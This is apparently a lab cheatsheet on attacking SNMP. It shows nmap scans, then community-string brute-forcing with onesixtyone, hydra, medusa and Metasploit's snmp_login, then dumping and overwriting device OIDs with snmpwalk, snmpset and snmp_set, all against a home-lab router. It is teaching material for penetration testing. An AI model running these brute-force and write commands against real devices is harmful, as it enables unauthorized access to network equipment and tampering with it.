# SNMP Cheatsheet

Tags : #snmp #strings #nse #snmp-info #snmp-brute
#snmpwalk #snmpget #snmpset #snmptranslate #snmp_enum #snmp_login #hydra #medusa 

## Basics
if you dont know snmp , no problem
here are resources to learn about snmp and terminology
```
https://www.networkmanagementsoftware.com/snmp-tutorial/

https://www.networkmanagementsoftware.com/snmp-tutorial-part-2-rounding-out-the-basics/
```

---

## Lab Setup

Kali linux - 192.168.0.101
Vyatta - 192.168.0.110

---

## Nmap Scan 
udp scan
```
$ sudo nmap -sU -Pn -p161,162 192.168.0.110        
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 23:53 EDT
Nmap scan report for 192.168.0.110
Host is up (0.00040s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp
162/udp closed        snmptrap
MAC Address: 00:0C:29:A9:41:81 (VMware)
```

default script scan 

```
$ sudo nmap -p161 -sC -sU -Pn 192.168.0.110
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 23:54 EDT
Nmap scan report for 192.168.0.110
Host is up (0.00039s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 72b2d3418298b260
|   snmpEngineBoots: 3
|_  snmpEngineTime: 43m38s
MAC Address: 00:0C:29:A9:41:81 (VMware)
```

default scripts try for `public` and `private` as community strings . if these are wrong we dont get much information
in our case these are not default strings
administrator have changed

lets use snmp-brute
this takes lot of time , we can use other tools
but we give try

syntax is
```
---
-- @usage
-- nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
--
-- @args snmp-brute.communitiesdb The filename of a list of community strings to try.
```

we need to specify wordlist file at that argument
```
$ sudo nmap  -Pn -p161 -sU --script=snmp-brute --script-args=snmp-brute.communitiesdb=/home/kali/tools/wordlists/rockyou.txt 192.168.0.110
```

it takes time 
lets use another tools

---

## Onesixtyone
syntax is simple
```
$ onesixtyone -c wordlist ipaddress
```

```
$ onesixtyone -c /home/kali/tools/wordlists/rockyou.txt 192.168.0.110
```

---

## Hydra

to check syntax of any protocol
```
hydra -U protocolname

hydra -U snmp

hydra -U ssh
```

now bruteforcing on 192.168.0.110
```
$ hydra -P /home/kali/tools/wordlists/rockyou.txt -m 1 192.168.0.110 snmp

-m stands for snmp version 1,2,3
```

---

## Medusa

we can use medusa tool to bruteforce for snmp community strings

```
$ medusa -u user -P  /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt -M snmp -h 192.168.0.110
```

we get the output
```
ACCOUNT CHECK: [snmp] Host: 192.168.0.110 (1 of 1, 0 complete) User: (null) (0 of 1, 1 complete) Password: test (1 of 0 complete)
ACCOUNT FOUND: [snmp] Host: 192.168.0.110 User: (null) Password: test [SUCCESS]
ACCOUNT CHECK: [snmp] Host: 192.168.0.110 (1 of 1, 0 complete) User: (null) (0 of 1, 2 complete) Password: test2 (2 of 0 complete)
ACCOUNT FOUND: [snmp] Host: 192.168.0.110 User: (null) Password: test2 [SUCCESS]
```
we got two strings like from metasploit module output

---

## snmpcheck

after getting a community string we can check with
`snmpcheck` tool

```
snmpcheck -c string ipaddress
```

---

## snmpwalk

if we got any read-only or read-write string we can dump whole data using `snmpwalk`

```
$ snmpwalk -v1 -c test 192.168.0.110 | head -n 10 
iso.3.6.1.2.1.1.1.0 = STRING: "Vyatta VC6.5R1"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.30803
iso.3.6.1.2.1.1.3.0 = Timeticks: (515600) 1:25:56.00
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "vyatta"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown"
iso.3.6.1.2.1.1.7.0 = INTEGER: 14
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.2.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
```

repace 1 with 2 or 3 for snmpv2,v3
-c for specifying community string

---

## snmpset 
```
TYPE: one of i, u, t, a, o, s, x, d, b
        i: INTEGER, u: unsigned INTEGER, t: TIMETICKS, a: IPADDRESS
        o: OBJID, s: STRING, x: HEX STRING, d: DECIMAL STRING, b: BITS
        U: unsigned int64, I: signed int64, F: float, D: double
```

if we got rw string we can modify OIDs
```
$ snmpset -v1 -c test2 192.168.0.110 iso.3.6.1.2.1.1.6.0 s hackedmaboi
```

u can verify with **snmpwalk** command
```
$ snmpwalk -v1 -c test 192.168.0.110 | head -n 10                  
iso.3.6.1.2.1.1.1.0 = STRING: "Vyatta VC6.5R1"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.30803
iso.3.6.1.2.1.1.3.0 = Timeticks: (592391) 1:38:43.91
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "vyatta"
iso.3.6.1.2.1.1.6.0 = STRING: "hacked"
iso.3.6.1.2.1.1.7.0 = INTEGER: 14
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.2.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
```

---

## snmpget

if u want to get specific OID value u can get it via **snmpget**

```
$ snmpget -v1 -c test2 192.168.0.110 iso.3.6.1.2.1.1.6.0  

iso.3.6.1.2.1.1.6.0 = STRING: "hacked"

```

---

## Metasploit
```
search snmp
```
gives lot of modules 

lets bruteforce for snmp community strings
try **snmp_login**
now set options
you can leave the default pass file as it is or u can mention rockyou.txt
after setting all the options ,
now **run barry run**
```
setg RHOSTS 192.168.0.110
set  STOP_ON_SUCCESS true
run
```

```
msf6 auxiliary(scanner/snmp/snmp_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 192.168.0.110:161 - Login Successful: test2 (Access level: read-write); Proof (sysDescr.0): Vyatta VC6.5R1
[+] 192.168.0.110:161 - Login Successful: test (Access level: read-only); Proof (sysDescr.0): Vyatta VC6.5R1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

we got two strings 
```
test - read-only access
test2 - read-write access
```

lets try for **snmp_enum**
this is post exploitation module
u need to know community string for this
set options
```
setg RHOSTS 192.168.0.110
set COMMUNITY test
run
```
now run the module
you will get the all information about host

metasploit also have snmp_set to change the OID values
```
set COMMUNITY test2
set OID oid
set OIDVALUE hackedagain
run
```

we get error because **iso** is not recognised by metasploit 
```
msf6 auxiliary(scanner/snmp/snmp_set) > set OID iso.3.6.1.2.1.1.6.0
OID => iso.3.6.1.2.1.1.6.0
msf6 auxiliary(scanner/snmp/snmp_set) > set OIDVALUE hacked2
OIDVALUE => hacked2
msf6 auxiliary(scanner/snmp/snmp_set) > run

[*] Try to connect to 192.168.0.110...
[-] 192.168.0.110 Error: ArgumentError ["iso", "3", "6", "1", "2", "1", "1", "6", "0"]:Array not a valid object ID ["/usr/share/metasploit-framework/lib/snmp/varbind.rb:161:in `rescue in initialize'", "/usr/share/metasploit-framework/lib/snmp/varbind.rb:152:in `initialize'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:243:in `new'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:243:in `parse_oid'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:218:in `oid'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:167:in `varbind_list'", "/usr/share/metasploit-framework/lib/snmp/manager.rb:239:in `get'", "/usr/share/metasploit-framework/lib/snmp/manager.rb:262:in `get_value'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/snmp/snmp_set.rb:48:in `run_host'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:120:in `block (2 levels) in run'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'"]
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
we need to translate that OID 
we can use tool called **snmptranslate**
```
$ snmptranslate -On iso.3.6.1.2.1.1.6.0
.1.3.6.1.2.1.1.6.0
```
-On stands for output numerically

now we can place that 
```
msf6 auxiliary(scanner/snmp/snmp_set) > set OID 1.3.6.1.2.1.1.6.0
OID => 1.3.6.1.2.1.1.6.0
msf6 auxiliary(scanner/snmp/snmp_set) > run

```

```
msf6 auxiliary(scanner/snmp/snmp_set) > run

[*] Try to connect to 192.168.0.110...
[*] Check initial value : OID 1.3.6.1.2.1.1.6.0 => hacked
[*] Set new value : OID 1.3.6.1.2.1.1.6.0 => hacked2
[*] Check new value : OID 1.3.6.1.2.1.1.6.0 => hacked2
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---